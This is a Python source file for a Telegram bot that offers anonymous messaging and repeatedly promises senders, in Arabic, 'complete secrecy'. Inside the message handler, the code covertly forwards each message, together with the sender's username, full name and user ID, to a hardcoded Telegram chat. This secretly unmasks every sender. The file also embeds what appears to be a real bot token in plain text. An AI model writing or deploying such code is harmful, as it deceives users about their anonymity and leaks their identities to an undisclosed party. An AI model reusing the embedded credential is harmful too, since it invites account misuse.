import os

import telebot

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from datetime import datetime

from prefect import flow


# Get the current date
current_date = datetime.now()

# Format the date as YYYY/MM/DD
formatted_date = current_date.strftime("%Y/%m/%d")

formatted_time = current_date.strftime("%I:%M:%S %p")



BOT_TOKEN = "7262866287:AAE0OquR5_0KnY8QaIJ-8fzoT9-39XYhIVA"

if not BOT_TOKEN:
    raise ValueError("Error: No BOT_TOKEN found in environment variables")

bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to store user states, recipient information, and message IDs
user_states = {}
user_recipients = {}
message_tracking = {}  # New dictionary to track messages

# States
ASKING_MESSAGE = "ASKING_MESSAGE"
ACTIVE_CONVERSATION = "ACTIVE_CONVERSATION"

def store_user_info(message):
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    user_id = message.chat.id
    username = message.chat.username or message.from_user.username
    return username, full_name, user_id

def create_link(user_id):
    return f"https://t.me/{bot.get_me().username}?start={user_id}"

@bot.message_handler(commands=['start'])
def handle_start(message):
    args = message.text.split()
    
    if len(args) > 1:
        original_user_id = args[1]
        bot.reply_to(message, """اهلاً بك ..

▫️ سوف يتم ارسال الرسالة الى المستخدم بسرية تامة

▫️اكتب ما تريد وسوف يتم ارساله بسرية تامة🤫""")
        user_states[message.chat.id] = ACTIVE_CONVERSATION
        user_recipients[message.chat.id] = original_user_id
    else:
        bot.reply_to(message, """
اهلاً وسهلاً بك:


▫️ شارك رابطك الخاص لتلقي رسائل مجهولة من أصدقائك وزملائك بكل سرية.

🌐 احصل على رابطك الشخصي الآن.
💌 اقرأ ما يقوله الآخرون عنك.

لإنشاء رابطك الخاص، أرسل الأمر /link.""")

@bot.message_handler(commands=['link'])
def generate_link(message):
    user_id = message.chat.id
    link = create_link(user_id)
    bot.reply_to(message, f"شارك هذا الرابط: {link}\nيمكن لأي شخص ينقر على هذا الرابط أن يرسل إليك رسالة بشكل مجهول.")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        user_states.pop(chat_id)
        user_recipients.pop(chat_id)
        bot.reply_to(message, "تم إيقاف المحادثة. إذا كنت ترغب في إرسال رسالة أخرى، استخدم الرابط مرة أخرى.")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == ACTIVE_CONVERSATION)
def handle_message(message):
    chat_id = message.chat.id
    recipient_id = user_recipients.get(chat_id)
    sender_username, sender_name, sender_id = store_user_info(message)

    if recipient_id:
        # Generate a unique identifier for this message
        unique_message_id = f"{chat_id}-{message.message_id}"

        # Store the mapping of this message ID to the original sender
        message_tracking[unique_message_id] = chat_id

        # Send the anonymous message to the recipient with a reply button
        markup = InlineKeyboardMarkup()
        reply_button = InlineKeyboardButton("رد على هذه الرسالة", callback_data=f"reply_{unique_message_id}")
        markup.add(reply_button)

        bot.send_message(936588681, f"Message from {sender_username} {sender_name} {sender_id} : {message.text}")
        bot.send_message(recipient_id, f"""
                         ⁣💌 وصلتك رسالة جديدة
⏱ وقت الرسالة: {formatted_date} - {formatted_time}
----
                         
{message.text}
                         
----
💡يمكنك الرد بعمل رد على هذه الرسالة .""", reply_markup=markup)

        bot.reply_to(message, "تم ارسال رسالتك.")
    else:
        bot.reply_to(message, "Error: Could not find the recipient. Please start over.")

# Handle replies to messages
@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def handle_reply(call):
    # Extract the unique message ID from the callback data
    unique_message_id = call.data.split("reply_")[1]

    # Find the original sender based on the message ID
    original_sender_id = message_tracking.get(unique_message_id)

    if original_sender_id:
        # Ask the recipient to type their reply
        bot.send_message(call.message.chat.id, "اكتب ردك هنا:")
        user_states[call.message.chat.id] = f"REPLYING_{unique_message_id}"
    else:
        bot.send_message(call.message.chat.id, "عذرًا، لا يمكن العثور على المرسل الأصلي لهذه الرسالة.")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id, "").startswith("REPLYING_"))
def handle_reply_message(message):
    # Extract the unique message ID from the state
    unique_message_id = user_states[message.chat.id].split("REPLYING_")[1]

    # Find the original sender based on the message ID
    original_sender_id = message_tracking.get(unique_message_id)

    if original_sender_id:
        # Send the reply back to the original sender
        bot.send_message(original_sender_id, f"""💬 لقد تلقيت ردًا على رسالتك:

{message.text}""")
        bot.reply_to(message, "تم ارسال ردك.")
        
        # Clear the state
        user_states.pop(message.chat.id)
    else:
        bot.reply_to(message, "Error: Could not find the original sender. Please try again.")

bot.infinity_polling()


